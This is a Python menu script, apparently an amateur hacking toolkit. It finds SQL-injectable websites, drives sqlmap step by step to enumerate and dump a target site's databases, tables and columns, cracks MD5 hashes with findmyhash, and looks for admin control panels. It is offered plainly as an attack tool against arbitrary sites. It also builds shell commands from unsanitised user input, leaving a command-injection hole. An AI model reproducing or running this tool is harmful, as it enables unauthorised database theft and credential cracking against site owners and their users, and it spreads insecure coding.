#!/usr/bin/python3
from search_sql import *
from admin import *
from sys import *
from time import *
from os import *
import urllib.request

#----------------------------------------
#| Code => Hak-Sy - JuGuRtHa Dz		|
#| Fb => hosam.ahmad2017                |
#| Gmail => hosamalshami019@gmail.com   |
#| From = > Syria                       |
#----------------------------------------

print('''

   ▄▄▄▄▀ ██  \033[1;32m █▄▄▄▄   ▄▀  ▄███▄     ▄▄▄▄▀ ▄█    ▄     ▄▀             ▄▄▄▄▄ ▀▄    ▄ 
▀▀▀ █    █ █  █  ▄▀ ▄▀    █▀   ▀ ▀▀▀ █    ██     █  ▄▀              █     ▀▄ █  █  
    █ \033[94m   █▄▄█ █▀▀▌  █ ▀▄  ██▄▄       █    ██ ██   █ █ ▀▄          ▄  ▀▀▀▀▄    ▀█   
   █     █  █ █  █  █   █ █▄   ▄▀   █     ▐█ █ █  █ █   █          ▀▄▄▄▄▀     █    
\033[1;91m  ▀         █   █    ███  ▀███▀    ▀       ▐ █  █ █  ███                    ▄▀     
           █   ▀                             █   ██                                
          ▀                                                             
''')
stdout.write('\033[94m')
print ('''

1- Search for infected sites sql

2- Sqlmap

3- Hash crack 

4- Extract Control Panel

''')
#-------------------END---------------#
stdout.write('\033[1;32m')
tools=input('enter tools number : '.title())

if tools=='1':
    system('clear')
    sql()
elif tools=='2':
	system('clear')
	url=input('Enter url here : '.title())
	sqlmap=system('sqlmap --url {} --dbs yes --random-agent'.format(url))
	data=input('enter name data : '.title())
	data1=system('sqlmap --url {} -D {} --tables yes --random-agent'.format(url,data))
	tabl=input('enter name tables : '.title())
	tabl1=system('sqlmap --url {} -D {} -T {} --columns yes --random-agent'.format(url,data,tabl))
	dump=input('enter thi columns : '.title())
	dump1=system('sqlmap --url {} -D {} -T {} -C {} --dump yes --random-agent'.format(url,data,tabl,dump))
                # These commands are sqlmap tool
                
elif tools=='3':
        system('clear')
        print('''
\033[94m
 .S    S.    .S_SSSs      sSSs   .S    S.           sSSs   .S_sSSs     .S_SSSs      sSSs   .S    S.   
.SS    SS.  .SS~SSSSS    d%%SP  .SS    SS.         d%%SP  .SS~YS%%b   .SS~SSSSS    d%%SP  .SS    SS.  
S%S    S%S  S%S   SSSS  d%S'    S%S    S%S        d%S'    S%S   `S%b  S%S   SSSS  d%S'    S%S    S&S  
S%S    S%S  S%S    S%S  S%|     S%S    S%S        S%S     S%S    S%S  S%S    S%S  S%S     S%S    d*S  
S%S SSSS%S  S%S SSSS%S  S&S     S%S SSSS%S        S&S     S%S    d*S  S%S SSSS%S  S&S     S&S   .S*S  
S&S  SSS&S  S&S  SSS%S  Y&Ss    S&S  SSS&S        S&S     S&S   .S*S  S&S  SSS%S  S&S     S&S_sdSSS   
S&S    S&S  S&S    S&S  `S&&S   S&S    S&S        S&S     S&S_sdSSS   S&S    S&S  S&S     S&S~YSSY%b  
S&S    S&S  S&S    S&S    `S*S  S&S    S&S        S&S     S&S~YSY%b   S&S    S&S  S&S     S&S    `S%  
S*S    S*S  S*S    S&S     l*S  S*S    S*S        S*b     S*S   `S%b  S*S    S&S  S*b     S*S     S%  
S*S    S*S  S*S    S*S    .S*P  S*S    S*S        S*S.    S*S    S%S  S*S    S*S  S*S.    S*S     S&  
S*S    S*S  S*S    S*S  sSS*S   S*S    S*S         SSSbs  S*S    S&S  S*S    S*S   SSSbs  S*S     S&  
SSS    S*S  SSS    S*S  YSS'    SSS    S*S          YSSP  S*S    SSS  SSS    S*S    YSSP  S*S     SS  
       SP          SP                  SP                 SP                 SP           SP          
       Y           Y                   Y                  Y                  Y            Y    
        ''')

        inpo=input('\033[1;91mSet Hash here to decrypt [MD5] : ')
        system('findmyhash MD5 -h {} '.format(inpo))
        # Decryption of type [MD5]
        
elif tools=='4':
	system('clear')
	admin()
        # Extract Control Panel
